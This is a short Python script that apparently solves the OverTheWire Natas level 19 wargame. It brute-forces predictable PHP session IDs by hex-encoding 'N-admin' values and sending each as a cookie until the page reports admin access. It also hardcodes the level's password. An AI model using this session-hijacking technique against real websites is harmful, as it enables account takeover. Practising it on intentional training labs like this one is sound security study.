#!/usr/bin/python3
import requests
import binascii
username = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

for secret in range(1,641):
    decode = (str(secret)+"-admin").encode("utf-8").hex()
    print("Trying "+decode+" , "+str(secret)+"-admin")
    cookies = {"PHPSESSID" : decode}
    #data = {"username" : "admin" , "password" : str(secret)}
    url = 'http://'+username+'.natas.labs.overthewire.org'
    session = requests.session()
    response = session.post(url,cookies = cookies ,auth = (username, password))
    content = response.text
    if ("You are an admin" in content):
         print("Got it : "+decode)
         print(content)
         break
